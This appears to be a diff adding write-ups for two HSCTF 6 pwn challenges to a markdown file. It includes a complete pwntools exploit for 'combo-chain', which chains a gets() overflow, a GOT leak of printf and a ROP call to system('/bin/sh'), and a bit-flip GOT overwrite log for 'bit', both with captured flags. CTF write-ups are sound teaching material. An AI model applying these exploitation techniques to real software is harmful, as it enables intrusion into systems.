@@ -4,9 +4,11 @@ A bunch of write-ups for HSCTF 6 which I participated in this year. The write-up
 
 ## Challenges
 
-|Challenge|Type|
-|---------|-----|
-|[English Sucks](#english-sucks)|misc|
+|Challenge|Type|Points|Solves|
+|---------|----|------|------|
+|[English Sucks](#english-sucks)|misc|497pts|8|
+|[bit](#bit)|pwn|401pts|76|
+|[combo-chain](#combo-chain)|pwn|368pts|102|
 
 # English Sucks
 
@@ -201,3 +203,93 @@ int main()
     return 0;
 }
 ```
+
+## combo-chain
+
+The vulnerability is triggered by a buffer overflow in the call to `gets()` inside `vuln()`. The `/bin/sh` string is leaked in the call to `printf()`.
+
+To exploit, the address of `printf` is leaked in libc via the global offset table using a call to `printf` itself. We load `%rdi` with the GOT entry for `printf`. `printf` will only print the first 5 bytes of `&printf` in libc as it contains `0x00` for the last 8-bits, e.g. `0x7f3722eec800`
+
+Using the address of `printf`, we calculate the offset to `system`. The `/bin/sh` string leaked by the call to `printf` in `vuln` is used to land us in a shell.
+
+```python
+#!/usr/bin/python2
+
+#
+# $ python get.py 
+# [+] Opening connection to pwn.hsctf.com on port 2345: Done
+# [*] printf @ 0x7fc3176f0800
+# [*] Switching to interactive mode
+# Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!:
+# $ cat flag
+# hsctf{i_thought_konami_code_would_work_here}
+#
+
+from pwn import *
+
+# p = process('./combo-chain')
+p = remote('pwn.hsctf.com', 2345)
+p.recvuntil('COMBO CARNAGE!: ')
+
+payload = 'A' * 16
+payload += p64(0x4011a4)  # main()
+payload += p64(0x401263)  # pop rdi; ret;
+payload += p64(0x404029)  # &(printf@got.plt) + 0x1
+payload += p64(0x401050)  # vuln+37
+payload += p64(0x401166)  # vuln()
+
+p.sendline(payload + '\n')
+p.recvuntil('COMBO CARNAGE!: ')
+
+printf = p.recv(5)
+printf_address = u64('\x00' + printf + '\x00\x00')
+log.info('printf @ {}'.format(hex(printf_address)))
+
+payload = 'B' * 16
+payload += p64(0x401263)  # pop rdi; ret;
+payload += p64(0x402031)  # "/bin/sh"
+payload += p64(printf_address - 0x10470)  # system()
+
+p.sendline(payload + '\n')
+p.interactive()
+p.close()
+```
+
+## bit
+
+We want to overwrite the global offset table entry for `exit` with the address of `flag`.
+
+```
+>>> x/wx 0x804a01c
+0x804a01c <exit@got.plt>:	0x080484f6
+
+$ nc pwn.hsctf.com 4444
+Welcome to the bit.
+
+No nonsense, just pwn this binary. You have 4 tries. Live up to kmh's expectations, and get the flag.
+
+Give me the address of the byte: 0804a01c
+Give me the index of the bit: 4
+Took care of 0804a01c at offset 4 for ya.
+
+Here's your new byte: 80484e6
+Give me the address of the byte: 0804a01c
+Give me the index of the bit: 6
+Took care of 0804a01c at offset 6 for ya.
+
+Here's your new byte: 80484a6
+Give me the address of the byte: 0804a01d
+Give me the index of the bit: 1
+Took care of 0804a01d at offset 1 for ya.
+
+Here's your new byte: 70080486
+Give me the address of the byte: 0804a020
+Give me the index of the bit: 1
+Took care of 0804a020 at offset 1 for ya.
+
+Here's your new byte: f7e0df72
+Well, at least you tried.
+[🛐] pwn gods like you deserve this: hsctf{flippin_pwn_g0d}
+```
+
+
